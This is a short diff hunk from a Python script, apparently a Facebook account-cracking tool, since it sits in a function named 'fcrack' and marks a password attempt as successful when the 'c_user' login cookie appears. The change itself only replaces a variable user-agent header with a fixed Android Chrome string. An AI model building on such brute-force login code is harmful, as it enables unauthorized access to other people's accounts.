@@ -845,7 +845,7 @@ def fcrack(uid,pwx,tl):
     'viewport-width': '980',
     'method': 'GET',
 	'scheme': 'https',
-    'user-agent': pro}
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
